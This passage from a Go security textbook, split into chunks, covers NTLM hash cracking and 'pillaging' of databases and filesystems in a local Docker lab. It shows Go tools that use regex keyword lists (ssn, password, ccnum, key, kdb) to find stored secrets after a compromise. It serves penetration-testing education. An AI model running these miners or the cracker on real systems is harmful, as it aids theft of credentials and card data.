{\nfmt.Println(\"[-] Failed to recover password\")\n}\n}\nListing 6-16: NTLM hash cracking (/ch-6/password-recovery/main.go)\nHivaNetwork.Com"
  },
  {
    "input": "Summary",
    "output": "The utility reads the hash as a command line argument,\ndecoding it to a []byte ❶. Then you loop over a supplied\npassword list ❷, calculating the hash of each entry by calling\nthe ntlmssp.Ntowfv2() function we discussed previously ❸.\nFinally, you compare the calculated hash with that of our\nsupplied value ❹. If they match, you have a hit and break out\nof the loop.\nSUMMARY\nYou’ve made it through a detailed examination of SMB,\ntouching on protocol specifics, reflection, structure field tags,\nand mixed encoding! You also learned how pass-the-hash\nworks, as well as a few useful utility programs that leverage\nthe SMB package.\nTo continue your learning, we encourage you to explore\nadditional SMB communications, particularly in relation to\nremote code execution, such as PsExec. Using a network\nsniffer, such as Wireshark, capture the packets and evaluate\nhow this functionality works.\nIn the next chapter, we move on from network protocol\nspecifics to focus on attacking and pillaging databases."
  },
  {
    "input": "7 ABUSING DATABASES AND FILESYSTEMS",
    "output": "7\nABUSING DATABASES AND\nFILESYSTEMS\nNow that we’ve covered the majority of common network\nprotocols used for active service interrogation, command and\ncontrol, and other malicious activity, let’s switch our focus to\nan equally important topic: data pillaging.\nAlthough data pillaging may not be as exciting as initial\nexploitation, lateral network movement, or privilege\nescalation, it’s a critical aspect of the overall attack chain.\nAfter all, we often need data in order to perform those other\nactivities. Commonly, the data is of tangible worth to an\nattacker. Although hacking an organization is thrilling, the\ndata itself is often a lucrative prize for the attacker and a\ndamning loss for the organization.\nDepending on which study you read, a breach in 2020 can\ncost an organization approximately $4 to $7 million. An IBM\nstudy estimates it costs an organization $129 to $355 per\nrecord stolen. Hell, a black hat hacker can make some serious\ncoin off the underground market by selling credit cards at a"
  },
  {
    "input": "Setting Up Databases with Docker",
    "output": "rate of $7 to $80 per card\n(http://online.wsj.com/public/resources/documents/securework\ns_hacker_annualreport.pdf).\nThe Target breach alone resulted in a compromise of 40\nmillion cards. In some cases, the Target cards were sold for as\nmuch as $135 per card (http://www.businessinsider.com/heres-\nwhat-happened-to-your-target-data-that-was-hacked-2014-\n10/). That’s pretty lucrative. We, in no way, advocate that type\nof activity, but folks with a questionable moral compass stand\nto make a lot of money from data pillaging.\nEnough about the industry and fancy references to online\narticles—let’s pillage! In this chapter, you’ll learn to set up\nand seed a variety of SQL and NoSQL databases and learn to\nconnect and interact with those databases via Go. We’ll also\ndemonstrate how to create a database and filesystem data\nminer that searches for key indicators of juicy information.\nSETTING UP DATABASES WITH\nDOCKER\nIn this section, you’ll install various database systems and then\nseed them with the data you’ll use in this chapter’s pillaging\nexamples. Where possible, you’ll use Docker on an Ubuntu\n18.04 VM. Docker is a software container platform that makes\nit easy to deploy and manage applications. You can bundle\napplications and their dependencies in a manner that makes\ntheir deployment straightforward. The container is\ncompartmentalized from the operating system in order to\nprevent the pollution of the host platform. This is nifty stuff.\nAnd for this chapter, you will use a variety of prebuilt\nDocker images for the databases you’ll be working with. If\nyou don’t have it already, install Docker. You can find Ubuntu\ninstructions at https://docs.docker.com/install/linux/docker-\nce/ubuntu/.\nNOTE\nWe’ve specifically chosen to omit details on setting up an Oracle instance.\nAlthough Oracle provides VM images that you can download and use to\ncreate a test database, we felt that it was unnecessary to walk you through\nthese steps, since they’re fairly similar to the MySQL examples below.\nWe’ll leave the Oracle-specific implementation as an exercise for you to do\nindependently.\nInstalling and Seeding MongoDB\nMongoDB is the only NoSQL database that you’ll use in this\nchapter. Unlike traditional relational databases, MongoDB\ndoesn’t communicate via SQL. Instead, MongoDB uses an\neasy-to-understand JSON syntax for retrieving and\nmanipulating data. Entire books have been dedicated to\nexplaining MongoDB, and a full explanation is certainly\nbeyond the scope of this book. For now, you’ll install the\nDocker image and seed it with fake data.\nUnlike traditional SQL databases, MongoDB is schema-\nless, which means that it doesn’t follow a predefined, rigid\nrule system for organizing table data. This explains why you’ll\nsee only insert commands in Listing 7-1 without any schema\ndefinitions. First, install the MongoDB Docker image with the\nfollowing command:\n$ docker run --name some-mongo -p 27017:27017 mongo\nThis command downloads the image named mongo from the\nDocker repository, spins up a new instance named some-mongo\n—the name you give the instance is arbitrary—and maps local\nport 27017 to the container port 27017. The port mapping is key,\nas it allows us to access the database instance directly from our\noperating system. Without it, it would be inaccessible.\nCheck that the container started automatically by listing all\nthe running containers:\n$ docker ps\nIn the event your container doesn’t start automatically, run\nthe following command:\n$ docker start some-mongo\nThe start command should get the container going.\nOnce your container starts, connect to the MongoDB\ninstance by using the run command—passing it the MongoDB\nclient; that way, you can interact with the database to seed\ndata:\n$ docker run -it --link some-mongo:mongo --rm mongo sh \\\n-c 'exec mongo\n\"$MONGO_PORT_27017_TCP_ADDR:$MONGO_PORT_27017_TCP_POR\nT/store\"'\n>\nThis magical command runs a disposable, second Docker\ncontainer that has the MongoDB client binary installed—so\nyou don’t have to install the binary on your host operating\nsystem—and uses it to connect to the some-mongo Docker\ncontainer’s MongoDB instance. In this example, you’re\nconnecting to a database named test.\nIn Listing 7-1, you insert an array of documents into the\ntransactions collection. (All the code listings at the root location\nof / exist under the provided github repo\nhttps://github.com/blackhat-go/bhg/.)\n> db.transactions.insert([\n{\n\"ccnum\" : \"4444333322221111\",\n\"date\" : \"2019-01-05\",\n\"amount\" : 100.12,\n\"cvv\" : \"1234\",\n\"exp\" : \"09/2020\"\n},\n{\n\"ccnum\" : \"4444123456789012\",\n\"date\" : \"2019-01-07\",\n\"amount\" : 2400.18,\n\"cvv\" : \"5544\",\n\"exp\" : \"02/2021\"\n},\n{\n\"ccnum\" : \"4465122334455667\",\n\"date\" : \"2019-01-29\",\n\"amount\" : 1450.87,\n\"cvv\" : \"9876\",\n\"exp\" : \"06/2020\"\n}\n]);\nListing 7-1: Inserting transactions into a MongoDB collection (/ch-7/db/seed-\nmongo.js)\nThat’s it! You’ve now created your MongoDB database\ninstance and seeded it with a transactions collection that contains\nthree fake documents for querying. You’ll get to the querying\npart in a bit, but first, you should know how to install and seed\ntraditional SQL databases.\nInstalling and Seeding PostgreSQL and MySQL\nDatabases\nDatabases\nPostgreSQL (also called Postgres) and MySQL are probably\nthe two most common, well-known, enterprise-quality, open\nsource relational database management systems, and official\nDocker images exist for both. Because of their similarity and\nthe general overlap in their installation steps, we batched\ntogether installation instructions for both here.\nFirst, much in the same way as for the MongoDB example\nin the previous section, download and run the appropriate\nDocker image:\n$ docker run --name some-mysql -p 3306:3306 -e\nMYSQL_ROOT_PASSWORD=password -d mysql\n$ docker run --name some-postgres -p 5432:5432 -e\nPOSTGRES_PASSWORD=password -d postgres\nAfter your containers are built, confirm they are running,\nand if they aren’t, you can start them via the docker start name\ncommand.\nNext, you can connect to the containers from the\nappropriate client—again, using the Docker image to prevent\ninstalling any additional files on the host—and proceed to\ncreate and seed the database. In Listing 7-2, you can see the\nMySQL logic.\n$ docker run -it --link some-mysql:mysql --rm mysql sh -c \\\n'exec mysql -h \"$MYSQL_PORT_3306_TCP_ADDR\" -\nP\"$MYSQL_PORT_3306_TCP_PORT\" \\\n-uroot -p\"$MYSQL_ENV_MYSQL_ROOT_PASSWORD\"'\nmysql> create database store;\nmysql> use store;\nmysql> create table transactions(ccnum varchar(32), date date, amount\nfloat(7,2),\n-> cvv char(4), exp date);\nListing 7-2: Creating and initializing a MySQL database\nThe listing, like the one that follows, starts a disposable\nDocker shell that executes the appropriate database client\nbinary. It creates and connects to the database named store and\nthen creates a table named transactions. The two listings are\nidentical, with the exception that they are tailored to different\ndatabase systems.\nIn Listing 7-3, you can see the Postgres logic, which differs\nslightly in syntax from MySQL.\n$ docker run -it --rm --link some-postgres:postgres postgres psql -h postgres -\nU postgres\npostgres=# create database store;\npostgres=# \\connect store\nstore=# create table transactions(ccnum varchar(32), date date, amount\nmoney, cvv\nchar(4), exp date);\nListing 7-3: Creating and initializing a Postgres database\nIn both MySQL and Postgres, the syntax is identical for\ninserting your transactions. For example, in Listing 7-4, you\ncan see how to insert three documents into a MySQL transactions\ncollection.\nmysql> insert into transactions(ccnum, date, amount, cvv, exp) values\n-> ('4444333322221111', '2019-01-05', 100.12, '1234', '2020-09-01');\nmysql> insert into transactions(ccnum, date, amount, cvv, exp) values\n-> ('4444123456789012', '2019-01-07', 2400.18, '5544', '2021-02-01');\nmysql> insert into transactions(ccnum, date, amount, cvv, exp) values\n-> ('4465122334455667', '2019-01-29', 1450.87, '9876', '2019-06-01');\nListing 7-4: Inserting transactions into MySQL databases (/ch-7/db/seed-pg-\nmysql.sql)\nTry inserting the same three documents into your Postgres\ndatabase.\nInstalling and Seeding Microsoft SQL Server\nDatabases\nIn 2016, Microsoft began making major moves to open-source\nsome of its core technologies. One of those technologies was\nMicrosoft SQL (MSSQL) Server. It feels pertinent to highlight\nthis information while demonstrating what, for so long, wasn’t\npossible—that is, installing MSSQL Server on a Linux\noperating system. Better yet, there’s a Docker image for it,\nwhich you can install with the following command:\n$ docker run --name some-mssql -p 1433:1433 -e 'ACCEPT_EULA=Y' \\\n-e 'SA_PASSWORD=Password1!' -d microsoft/mssql-server-linux\nThat command is similar to the others you ran in the\nprevious two sections, but per the documentation, the\nSA_PASSWORD value needs to be complex—a combination of\nuppercase letters, lowercase letters, numbers, and special\ncharacters—or you won’t be able to authenticate to it. Since\nthis is just a test instance, the preceding value is trivial but\nminimally meets those requirements—just as we see on\nenterprise networks all the time!\nWith the image installed, start the container, create the\nschema, and seed the database, as in Listing 7-5.\n$ docker exec -it some-mssql /opt/mssql-tools/bin/sqlcmd -S localhost \\\n-U sa -P 'Password1!'\n> create database store;\n> go\n> use store;\n> create table transactions(ccnum varchar(32), date date, amount\ndecimal(7,2),\n> cvv char(4), exp date);"
  },
  {
    "input": "Connecting and Querying Databases in Go",
    "output": "> go\n> insert into transactions(ccnum, date, amount, cvv, exp) values\n> ('4444333322221111', '2019-01-05', 100.12, '1234', '2020-09-01');\n> insert into transactions(ccnum, date, amount, cvv, exp) values\n> ('4444123456789012', '2019-01-07', 2400.18, '5544', '2021-02-01');\n> insert into transactions(ccnum, date, amount, cvv, exp) values\n> ('4465122334455667', '2019-01-29', 1450.87, '9876', '2020-06-01');\n> go\nListing 7-5: Creating and seeding an MSSQL database\nThe previous listing replicates the logic we demonstrated\nfor MySQL and Postgres earlier. It uses Docker to connect to\nthe service, creates and connects to the store database, and\ncreates and seeds a transactions table. We’re presenting it\nseparately from the other SQL databases because it has some\nMSSQL-specific syntax.\nCONNECTING AND QUERYING\nDATABASES IN GO\nNow that you have a variety of test databases to work with,\nyou can build the logic to connect to and query those databases\nfrom a Go client. We’ve divided this discussion into two\ntopics—one for MongoDB and one for traditional SQL\ndatabases.\nQuerying MongoDB\nDespite having an excellent standard SQL package, Go\ndoesn’t maintain a similar package for interacting with\nNoSQL databases. Instead you’ll need to rely on third-party\npackages to facilitate this interaction. Rather than inspect the\nimplementation of each third-party package, we’ll focus\nHivaNetwork.Com\npurely on MongoDB. We’ll use the mgo (pronounce mango)\nDB driver for this.\nStart by installing the mgo driver with the following\ncommand:\n$ go get gopkg.in/mgo.v2\nYou can now establish connectivity and query your store\ncollection (the equivalent of a table), which requires even less\ncode than the SQL sample code we’ll create later (see Listing\n7-6).\npackage main\nimport (\n\"fmt\"\n\"log\"\nmgo \"gopkg.in/mgo.v2\"\n)\ntype Transaction struct { ❶\nCCNum string `bson:\"ccnum\"`\nDate string `bson:\"date\"`\nAmount float32 `bson:\"amount\"`\nCvv string `bson:\"cvv\"`\nExpiration string `bson:\"exp\"`\n}\nfunc main() {\nsession, err := mgo.Dial(\"127.0.0.1\") ❷\nif err != nil {\nlog.Panicln(err)\n}\ndefer session.Close()\nresults := make([]Transaction, 0)\nif err := session.DB(\"store\").C(\"transactions\").Find(nil).All(&results)❸; err !=\nnil {\nlog.Panicln(err)\n}\nfor _, txn := range results { ❹\nfmt.Println(txn.CCNum, txn.Date, txn.Amount, txn.Cvv, txn.Expiration)\n}\n}\nListing 7-6: Connecting to and querying a MongoDB database (/ch-7/db/mongo-\nconnect/main.go)\nFirst, you define a type, Transaction, which will represent a\nsingle document from your store collection ❶. The internal\nmechanism for data representation in MongoDB is binary\nJSON. For this reason, use tagging to define any marshaling\ndirectives. In this case, you’re using tagging to explicitly\ndefine the element names to be used in the binary JSON data.\nIn your main() function ❷, call mgo.Dial() to create a session\nby establishing a connection to your database, testing to make\nsure no errors occurred, and deferring a call to close the\nsession. You then use the session variable to query the store\ndatabase ❸, retrieving all the records from the transactions\ncollection. You store the results in a Transaction slice, named\nresults. Under the covers, your structure tags are used to\nunmarshal the binary JSON to your defined type. Finally, loop\nover your result set and print them to the screen ❹. In both\nthis case and the SQL sample in the next section, your output\nshould look similar to the following:\n$ go run main.go\n4444333322221111 2019-01-05 100.12 1234 09/2020\n4444123456789012 2019-01-07 2400.18 5544 02/2021\n4465122334455667 2019-01-29 1450.87 9876 06/2020\nQuerying SQL Databases\nQuerying SQL Databases\nGo contains a standard package, called database/sql, that defines\nan interface for interacting with SQL and SQL-like databases.\nThe base implementation automatically includes functionality\nsuch as connection pooling and transaction support. Database\ndrivers adhering to this interface automatically inherit these\ncapabilities and are essentially interchangeable, as the API\nremains consistent between drivers. The function calls and\nimplementation in your code are identical whether you’re\nusing Postgres, MSSQL, MySQL, or some other driver. This\nmakes it convenient to switch backend databases with minimal\ncode change on the client. Of course, the drivers can\nimplement database-specific capabilities and use different\nSQL syntax, but the function calls are nearly identical.\nFor this reason, we’ll show you how to connect to just one\nSQL database—MySQL—and leave the other SQL databases\nas an exercise for you. You start by installing the driver with\nthe following command:\n$ go get github.com/go-sql-driver/mysql\nThen, you can create a basic client that connects to the\ndatabase and retrieves the information from your transactions\ntable—using the script in Listing 7-7.\npackage main\nimport (\n\"database/sql\" ❶\n\"fmt\"\n\"log\"\n\"github.com/go-sql-driver/mysql\" ❷\n)\nfunc main() {\ndb, err := sql.Open(\"mysql\", \"root:password@tcp(127.0.0.1:3306)/store\")❸\nif err != nil {\nlog.Panicln(err)\n}\ndefer db.Close()\nvar (\nccnum, date, cvv, exp string\namount float32\n)\nrows, err := db.Query(\"SELECT ccnum, date, amount, cvv, exp FROM\ntransactions\") ❹\nif err != nil {\nlog.Panicln(err)\n}\ndefer rows.Close()\nfor rows.Next() {\nerr := rows.Scan(&ccnum, &date, &amount, &cvv, &exp)❺\nif err != nil {\nlog.Panicln(err)\n}\nfmt.Println(ccnum, date, amount, cvv, exp)\n}\nif rows.Err() != nil {\nlog.Panicln(err)\n}\n}\nListing 7-7: Connecting to and querying a MySQL database (/ch-7/db/mysql-\nconnect/main.go)\nThe code begins by importing Go’s database/sql package ❶.\nThis allows you to utilize Go’s awesome standard SQL library\ninterface to interact with the database. You also import your\nMySQL database driver ❷. The leading underscore indicates\nthat it’s imported anonymously, which means its exported"
  },
  {
    "input": "Building a Database Miner",
    "output": "types aren’t included, but the driver registers itself with the sql\npackage so that the MySQL driver itself handles the function\ncalls.\nNext, you call sql.Open() to establish a connection to our\ndatabase ❸. The first parameter specifies which driver should\nbe used—in this case, the driver is mysql—and the second\nparameter specifies your connection string. You then query\nyour database, passing an SQL statement to select all rows\nfrom your transactions table ❹, and then loop over the rows,\nsubsequently reading the data into your variables and printing\nthe values ❺.\nThat’s all you need to do to query a MySQL database.\nUsing a different backend database requires only the following\nminor changes to the code:\n1. Import the correct database driver.\n2. Change the parameters passed to sql.Open().\n3. Tweak the SQL syntax to the flavor required by your backend database.\nAmong the several database drivers available, many are\npure Go, while a handful of others use cgo for some underlying\ninteraction. Check out the list of available drivers at\nhttps://github.com/golang/go/wiki/SQLDrivers/.\nBUILDING A DATABASE MINER\nIn this section, you will create a tool that inspects the database\nschema (for example, column names) to determine whether the\ndata within is worth pilfering. For instance, say you want to\nfind passwords, hashes, social security numbers, and credit\ncard numbers. Rather than building one monolithic utility that\nmines various backend databases, you’ll create separate\nutilities—one for each database—and implement a defined\ninterface to ensure consistency between the implementations.\nThis flexibility may be somewhat overkill for this example,\nbut it gives you the opportunity to create reusable and portable\ncode.\nThe interface should be minimal, consisting of a few basic\ntypes and functions, and it should require the implementation\nof a single method to retrieve database schema. Listing 7-8,\ncalled dbminer.go, defines the database miner’s interface.\npackage dbminer\nimport (\n\"fmt\"\n\"regexp\"\n)\n❶ type DatabaseMiner interface {\nGetSchema() (*Schema, error)\n}\n❷ type Schema struct {\nDatabases []Database\n}\ntype Database struct {\nName string\nTables []Table\n}\ntype Table struct {\nName string\nColumns []string\n}\n❸ func Search(m DatabaseMiner) error {\n❹ s, err := m.GetSchema()\nif err != nil {\nreturn err\n}\nre := getRegex()\n❺ for _, database := range s.Databases {\nfor _, table := range database.Tables {\nfor _, field := range table.Columns {\nfor _, r := range re {\nif r.MatchString(field) {\nfmt.Println(database)\nfmt.Printf(\"[+] HIT: %s\\n\", field)\n}\n}\n}\n}\n}\nreturn nil\n}\n❻ func getRegex() []*regexp.Regexp {\nreturn []*regexp.Regexp{\nregexp.MustCompile(`(?i)social`),\nregexp.MustCompile(`(?i)ssn`),\nregexp.MustCompile(`(?i)pass(word)?`),\nregexp.MustCompile(`(?i)hash`),\nregexp.MustCompile(`(?i)ccnum`),\nregexp.MustCompile(`(?i)card`),\nregexp.MustCompile(`(?i)security`),\nregexp.MustCompile(`(?i)key`),\n}\n}\n/* Extranneous code omitted for brevity */\nListing 7-8: Database miner implementation (/ch-7/db/dbminer/dbminer.go)\nThe code begins by defining an interface named\nDatabaseMiner ❶. A single method, called GetSchema(), is required\nfor any types that implement the interface. Because each\nbackend database may have specific logic to retrieve the\ndatabase schema, the expectation is that each specific utility\ncan implement the logic in a way that’s unique to the backend\ndatabase and driver in use.\nNext, you define a Schema type, which is composed of a few\nsubtypes also defined here ❷. You’ll use the Schema type to\nlogically represent the database schema—that is, databases,\ntables, and columns. You might have noticed that your\nGetSchema() function, within the interface definition, expects\nimplementations to return a *Schema.\nNow, you define a single function, called Search(), which\ncontains the bulk of the logic. The Search() function expects a\nDatabaseMiner instance to be passed to it during the function call,\nand stores the miner value in a variable named m ❸. The\nfunction starts by calling m.GetSchema() to retrieve the schema\n❹. The function then loops through the entire schema,\nsearching against a list of regular expression (regex) values for\ncolumn names that match ❺. If it finds a match, the database\nschema and matching field are printed to the screen.\nLastly, define a function named getRegex() ❻. This function\ncompiles regex strings by using Go’s regexp package and\nreturns a slice of these values. The regex list consists of case-\ninsensitive strings that match against common or interesting\nfield names such as ccnum, ssn, and password.\nWith your database miner’s interface in hand, you can\ncreate utility-specific implementations. Let’s start with the\nMongoDB database miner.\nImplementing a MongoDB Database Miner\nThe MongoDB utility program in Listing 7-9 implements the\ninterface defined in Listing 7-8 while also integrating the\ndatabase connectivity code you built in Listing 7-6.\npackage main\nimport (\n\"os\"\n❶ \"github.com/bhg/ch-7/db/dbminer\"\n\"gopkg.in/mgo.v2\"\n\"gopkg.in/mgo.v2/bson\"\n)\n❷ type MongoMiner struct {\nHost string\nsession *mgo.Session\n}\n❸ func New(host string) (*MongoMiner, error) {\nm := MongoMiner{Host: host}\nerr := m.connect()\nif err != nil {\nreturn nil, err\n}\nreturn &m, nil\n}\n❹ func (m *MongoMiner) connect() error {\ns, err := mgo.Dial(m.Host)\nif err != nil {\nreturn err\n}\nm.session = s\nreturn nil\n}\n❺ func (m *MongoMiner) GetSchema() (*dbminer.Schema, error) {\nvar s = new(dbminer.Schema)\ndbnames, err := m.session.DatabaseNames()❻\nif err != nil {\nreturn nil, err\n}\nfor _, dbname := range dbnames {\ndb := dbminer.Database{Name: dbname, Tables: []dbminer.Table{}}\ncollections, err := m.session.DB(dbname).CollectionNames()❼\nif err != nil {\nreturn nil, err\n}\nfor _, collection := range collections {\ntable := dbminer.Table{Name: collection, Columns: []string{}}\nvar docRaw bson.Raw\nerr := m.session.DB(dbname).C(collection).Find(nil).One(&docRaw)❽\nif err != nil {\nreturn nil, err\n}\nvar doc bson.RawD\nif err := docRaw.Unmarshal(&doc); err != nil {❾\nif err != nil {\nreturn nil, err\n}\n}\nfor _, f := range doc {\ntable.Columns = append(table.Columns, f.Name)\n}\ndb.Tables = append(db.Tables, table)\n}\ns.Databases = append(s.Databases, db)\n}\nreturn s, nil\n}\nfunc main() {\nHivaNetwork.Com\nmm, err := New(os.Args[1])\nif err != nil {\npanic(err)\n}\n❿ if err := dbminer.Search(mm); err != nil {\npanic(err)\n}\n}\nListing 7-9: Creating a MongoDB database miner (/ch-7/db/mongo/main.go)\nYou start by importing the dbminer package that defines your\nDatabaseMiner interface ❶. Then you define a MongoMiner type\nthat will be used to implement the interface ❷. For\nconvenience, you define a New() function that creates a new\ninstance of your MongoMiner type ❸, calling a method named\nconnect() that establishes a connection to the database ❹. The\nentirety of this logic essentially bootstraps your code,\nconnecting to the database in a fashion similar to that\ndiscussed in Listing 7-6.\nThe most interesting portion of the code is your\nimplementation of the GetSchema() interface method ❺. Unlike\nin the previous MongoDB sample code in Listing 7-6, you are\nnow inspecting the MongoDB metadata, first retrieving\ndatabase names ❻ and then looping over those databases to\nretrieve each database’s collection names ❼. Lastly, the\nfunction retrieves the raw document that, unlike a typical\nMongoDB query, uses lazy unmarshaling ❽. This allows you\nto explicitly unmarshal the record into a generic structure so\nthat you can inspect field names ❾. If not for lazy\nunmarshaling, you would have to define an explicit type,\nlikely using bson tag attributes, in order to instruct your code\nhow to unmarshal the data into a struct you defined. In this\ncase, you don’t know (or care) about the field types or\nstructure—you just want the field names (not the data)—so\nthis is how you can unmarshal structured data without needing\nto know the structure of that data beforehand.\nYour main() function expects the IP address of your\nMongoDB instance as its lone argument, calls your New()\nfunction to bootstrap everything, and then calls dbminer.Search(),\npassing to it your MongoMiner instance ❿. Recall that\ndbminer.Search() calls GetSchema() on the received DatabaseMiner\ninstance; this calls your MongoMiner implementation of the\nfunction, which results in the creation of dbminer.Schema that is\nthen searched against the regex list in Listing 7-8.\nWhen you run your utility, you are blessed with the\nfollowing output:\n$ go run main.go 127.0.0.1\n[DB] = store\n[TABLE] = transactions\n[COL] = _id\n[COL] = ccnum\n[COL] = date\n[COL] = amount\n[COL] = cvv\n[COL] = exp\n[+] HIT: ccnum\nYou found a match! It may not look pretty, but it gets the\njob done—successfully locating the database collection that\nhas a field named ccnum.\nWith your MongoDB implementation built, in the next\nsection, you’ll do the same for a MySQL backend database.\nImplementing a MySQL Database Miner\nTo make your MySQL implementation work, you’ll inspect\nthe information_schema.columns table. This table maintains metadata\nabout all the databases and their structures, including table and\ncolumn names. To make the data the simplest to consume, use\nthe following SQL query, which removes information about\nsome of the built-in MySQL databases that are of no\nconsequence to your pillaging efforts:\nSELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME FROM\ncolumns\nWHERE TABLE_SCHEMA NOT IN ('mysql', 'information_schema',\n'performance_schema', 'sys')\nORDER BY TABLE_SCHEMA, TABLE_NAME\nThe query produces results resembling the following:\n+--------------+--------------+-------------+\n| TABLE_SCHEMA | TABLE_NAME | COLUMN_NAME |\n+--------------+--------------+-------------+\n| store | transactions | ccnum |\n| store | transactions | date |\n| store | transactions | amount |\n| store | transactions | cvv |\n| store | transactions | exp |\n--snip--\nAlthough using that query to retrieve schema information is\npretty straightforward, the complexity in your code comes\nfrom logically trying to differentiate and categorize each row\nwhile defining your GetSchema() function. For example,\nconsecutive rows of output may or may not belong to the same\ndatabase or table, so associating the rows to the correct\ndbminer.Database and dbminer.Table instances becomes a somewhat\ntricky endeavor.\nListing 7-10 defines the implementation.\ntype MySQLMiner struct {\nHost string\nDb sql.DB\n}\nfunc New(host string) (*MySQLMiner, error) {\nm := MySQLMiner{Host: host}\nerr := m.connect()\nif err != nil {\nreturn nil, err\n}\nreturn &m, nil\n}\nfunc (m *MySQLMiner) connect() error {\ndb, err := sql.Open(\n\"mysql\",\n❶ fmt.Sprintf(\"root:password@tcp(%s:3306)/information_schema\", m.Host))\nif err != nil {\nlog.Panicln(err)\n}\nm.Db = *db\nreturn nil\n}\nfunc (m *MySQLMiner) GetSchema() (*dbminer.Schema, error) {\nvar s = new(dbminer.Schema)\n❷ sql := `SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME\nFROM columns\nWHERE TABLE_SCHEMA NOT IN\n('mysql', 'information_schema', 'performance_schema', 'sys')\nORDER BY TABLE_SCHEMA, TABLE_NAME`\nschemarows, err := m.Db.Query(sql)\nif err != nil {\nreturn nil, err\n}\ndefer schemarows.Close()\nvar prevschema, prevtable string\nvar db dbminer.Database\nvar table dbminer.Table\n❸ for schemarows.Next() {\nvar currschema, currtable, currcol string\nif err := schemarows.Scan(&currschema, &currtable, &currcol); err != nil {\nreturn nil, err\n}\n❹ if currschema != prevschema {\nif prevschema != \"\" {\ndb.Tables = append(db.Tables, table)\ns.Databases = append(s.Databases, db)\n}\ndb = dbminer.Database{Name: currschema, Tables: []dbminer.Table{}}\nprevschema = currschema\nprevtable = \"\"\n}\n❺ if currtable != prevtable {\nif prevtable != \"\" {\ndb.Tables = append(db.Tables, table)\n}\ntable = dbminer.Table{Name: currtable, Columns: []string{}}\nprevtable = currtable\n}\n❻ table.Columns = append(table.Columns, currcol)\n}\ndb.Tables = append(db.Tables, table)\ns.Databases = append(s.Databases, db)\nif err := schemarows.Err(); err != nil {\nreturn nil, err\n}\nreturn s, nil\n}\nfunc main() {\nmm, err := New(os.Args[1])\nif err != nil {\npanic(err)\n}\ndefer mm.Db.Close()\nif err := dbminer.Search(mm); err != nil {\npanic(err)\n}\n}\nListing 7-10: Creating a MySQL database miner (/ch-7/db/mysql/main.go/)\nA quick glance at the code and you’ll probably realize that\nmuch of it is very, very similar to the MongoDB example in\nthe preceding section. As a matter of fact, the main() function is\nidentical.\nThe bootstrapping functions are also similar—you just\nchange the logic to interact with MySQL rather than\nMongoDB. Notice that this logic connects to your\ninformation_schema database ❶, so that you can inspect the\ndatabase schema.\nMuch of the code’s complexity resides within the\nGetSchema() implementation. Although you are able to retrieve\nthe schema information by using a single database query ❷,\nyou then have to loop over the results ❸, inspecting each row\nso you can determine what databases exist, what tables exist in\neach database, and what columns exist for each table. Unlike\nin your MongoDB implementation, you don’t have the luxury\nof JSON/BSON with attribute tags to marshal and unmarshal\ndata into complex structures; you maintain variables to track\nthe information in your current row and compare it with the\ndata from the previous row, in order to determine whether\nyou’ve encountered a new database or table. Not the most\nelegant solution, but it gets the job done."
  },
  {
    "input": "Pillaging a Filesystem",
    "output": "Next, you check whether the database name for your\ncurrent row differs from your previous row ❹. If so, you\ncreate a new miner.Database instance. If it isn’t your first iteration\nof the loop, add the table and database to your miner.Schema\ninstance. You use similar logic to track and add miner.Table\ninstances to your current miner.Database ❺. Lastly, add each of\nthe columns to our miner.Table ❻.\nNow, run the program against your Docker MySQL\ninstance to confirm that it works properly, as shown here:\n$ go run main.go 127.0.0.1\n[DB] = store\n[TABLE] = transactions\n[COL] = ccnum\n[COL] = date\n[COL] = amount\n[COL] = cvv\n[COL] = exp\n[+] HIT: ccnum\nThe output should be almost indiscernible from your\nMongoDB output. This is because your dbminer.Schema isn’t\nproducing any output—the dbminer.Search() function is. This is\nthe power of using interfaces. You can have specific\nimplementations of key features, yet still utilize a single,\nstandard function to process your data in a predictable, usable\nmanner.\nIn the next section, you’ll step away from databases and\ninstead focus on pillaging filesystems.\nPILLAGING A FILESYSTEM\nIn this section, you’ll build a utility that walks a user-supplied\nfilesystem path recursively, matching against a list of\ninteresting filenames that you would deem useful as part of a\npost-exploitation exercise. These files may contain, among\nother things, personally identifiable information, usernames,\npasswords, system logins, and password database files.\nThe utility looks specifically at filenames rather than file\ncontents, and the script is made much simpler by the fact that\nGo contains standard functionality in its path/filepath package\nthat you can use to easily walk a directory structure. You can\nsee the utility in Listing 7-11.\npackage main\nimport (\n\"fmt\"\n\"log\"\n\"os\"\n\"path/filepath\"\n\"regexp\"\n)\n❶ var regexes = []*regexp.Regexp{\nregexp.MustCompile(`(?i)user`),\nregexp.MustCompile(`(?i)password`),\nregexp.MustCompile(`(?i)kdb`),\nregexp.MustCompile(`(?i)login`),\n}\n❷ func walkFn(path string, f os.FileInfo, err error) error {\nfor _, r := range regexes {\n❸ if r.MatchString(path) {\nfmt.Printf(\"[+] HIT: %s\\n\", path)\n}\n}\nreturn nil\n}\nfunc main() {\nroot := os.Args[1]\n❹ if err := filepath.Walk(root, walkFn); err != nil {\nlog.Panicln(err)\n}\n}\nListing 7-11: Walking and searching a filesystem (/ch-7/filesystem/main.go)\nIn contrast to your database-mining implementations, the\nfilesystem pillaging setup and logic might seem a little too\nsimple. Similar to the way you created your database\nimplementations, you define a regex list for identifying\ninteresting filenames ❶. To keep the code minimal, we\nlimited the list to just a handful of items, but you can expand\nthe list to accommodate more practical usage.\nNext, you define a function, named walkFn(), that accepts a\nfile path and some additional parameters ❷. The function\nloops over your regular expression list and checks for matches\n❸, displaying them to stdout. The walkFn() function ❹ is used\nin the main() function, and passed as a parameter to filepath.Walk().\nThe Walk() function expects two parameters—a root path and a\nfunction (in this case, walkFn())—and recursively walks the\ndirectory structure starting at the value supplied as the root\npath, calling walkFn() for every directory and file it encounters.\nWith your utility complete, navigate to your desktop and\ncreate the following directory structure:\n$ tree targetpath/\ntargetpath/\n--- anotherpath\n- --- nothing.txt\n- --- users.csv"
  },
  {
    "input": "Summary",
